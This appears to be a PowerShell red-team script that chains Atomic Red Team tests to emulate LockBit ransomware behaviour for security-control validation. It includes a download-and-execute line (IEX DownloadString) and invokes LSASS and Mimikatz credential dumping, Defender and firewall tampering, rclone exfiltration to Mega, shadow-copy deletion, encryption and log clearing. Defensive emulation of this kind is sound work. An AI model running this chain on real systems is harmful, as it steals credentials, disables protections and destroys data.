# Lockbit Ransomware Atomic Simulation
# Author : Rahmat Nurfauzi (@infosecn1nja)
# Date : 16/05/2023
# Simulate Lockbit Ransomware tactics, techniques, and procedures (TTP) with atomic red team to validate security controls
#
# References
# https://www.mandiant.com/resources/blog/unc2165-shifts-to-evade-sanctions
# https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-075a
# https://research.nccgroup.com/2022/08/19/back-in-black-unlocking-a-lockbit-3-0-ransomware-attack/
# https://unit42.paloaltonetworks.com/lockbit-2-ransomware/
# 

Set-ExecutionPolicy Bypass -Force

function Test-Administrator  
{  
    [OutputType([bool])]
    param()
    process {
        [Security.Principal.WindowsPrincipal]$user = [Security.Principal.WindowsIdentity]::GetCurrent();
        return $user.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator);
    }
}

if(-not (Test-Administrator))
{
    Write-Error "This script must be executed as Administrator.";
    exit 1;
}

$Logfile = $MyInvocation.MyCommand.Path -replace '\.ps1$', '.log'
Start-Transcript -Path $Logfile

if (Test-Path "C:\AtomicRedTeam\") {
   Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1" -Force
}
else {
  IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1'); Install-AtomicRedTeam -getAtomics -Force
  Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1" -Force
}

# Atomic Test #1 - Rundll32 with Ordinal Value
Invoke-AtomicTest T1218.011 -TestNumber 11

# Atomic Test #2 - Windows - Discover domain trusts with nltest
Invoke-AtomicTest T1482 -TestNumbers 2

# Atomic Test #3 - Basic Permission Groups Discovery Windows (Domain)
Invoke-AtomicTest T1069.002 -TestNumbers 1

# Atomic Test #4 - Cached Credential Dump via Cmdkey
Invoke-AtomicTest T1003.005

# Atomic Test #5 - Create shortcut to cmd in startup folders
Invoke-AtomicTest T1547.009 -TestNumbers 2

# Atomic Test #6 - Scheduled Task Startup Script
Invoke-AtomicTest T1053.005 -TestNumbers 1

# Atomic Test #7 - WinPwn - UAC Bypass ccmstp technique
Invoke-AtomicTest T1548.002 -TestNumbers 19

# Atomic Test #8 - Rubeus kerberoast
Invoke-AtomicTest T1558.003 -TestNumbers 2 -GetPrereqs
Invoke-AtomicTest T1558.003 -TestNumbers 2

# Atomic Test #9 - SeDebugPrivilege token duplication
Invoke-AtomicTest T1134.001 -TestNumbers 2

# Atomic Test #10 - Copy and Execute File with PsExec
Invoke-AtomicTest T1021.002 -TestNumbers 3 -GetPrereqs
Invoke-AtomicTest T1021.002 -TestNumbers 3

# Atomic Test #11 - Dump LSASS.exe Memory using ProcDump
Invoke-AtomicTest T1003.001 -TestNumber 1 -GetPrereqs
Invoke-AtomicTest T1003.001 -TestNumber 1

# Atomic Test #12 - Offline Credential Theft With Mimikatz
Invoke-AtomicTest T1003.001 -TestNumber 6 -GetPrereqs
Invoke-AtomicTest T1003.001 -TestNumber 6

# Atomic Test #13 - Tamper with Windows Defender ATP PowerShell
Invoke-AtomicTest T1562.001 -TestNumbers 5

# Atomic Test #14 - Windows - Stop service by killing process
Invoke-AtomicTest T1489 -TestNumbers 3

# Atomic Test #15 - LockBit Black - Modify Group policy settings -Powershell
Invoke-AtomicTest T1484.001 -TestNumbers 2

# Atomic Test #16 - LockBit Black - Disable Privacy Settings Experience Using Registry -cmd
Invoke-AtomicTest T1484.001 -TestNumbers 32

# Atomic Test #17 - LockBit Black - Use Registry Editor to turn on automatic logon -cmd
Invoke-AtomicTest T1484.001 -TestNumbers 33

# Atomic Test #18 - LockBit Black - Disable Privacy Settings Experience Using Registry -Powershell
Invoke-AtomicTest T1484.001 -TestNumbers 34

# Atomic Test #19 - Disable Microsoft Defender Firewall via Registry
Invoke-AtomicTest T1562.004 -TestNumbers 2

# Atomic Test #20 - Compress Data and lock with password for Exfiltration with 7zip
Invoke-AtomicTest T1560.001 -TestNumbers 4

# Atomic Test #21 - Exfiltrate data with rclone to cloud Storage - Mega (Windows)
Invoke-AtomicTest T1567.002 -GetPrereqs
Invoke-AtomicTest T1567.002

# Atomic Test #22 - Windows - Delete Volume Shadow Copies
Invoke-AtomicTest T1490 -TestNumbers 1

# Atomic Test #23 - Windows - Disable Windows Recovery Console Repair
Invoke-AtomicTest T1490 -TestNumbers 4

# Atomic Test #24 - Data Encrypted with GPG4Win
New-Item -ItemType File -Path "$env:temp\test.txt" -Value "Hello World!" -Force
Invoke-AtomicTest T1486 -TestNumbers 6 -GetPrereqs
Invoke-AtomicTest T1486 -TestNumbers 6

# Atomic Test #25  - PureLocker Ransom Note
Invoke-AtomicTest T1486 -TestNumbers 5

# Atomic Test #26 - Replace Desktop Wallpaper
Invoke-AtomicTest T1491.001 -TestNumbers 1

# Atomic Test #27 - Clear Logs
Invoke-AtomicTest T1070.001 -TestNumbers 1
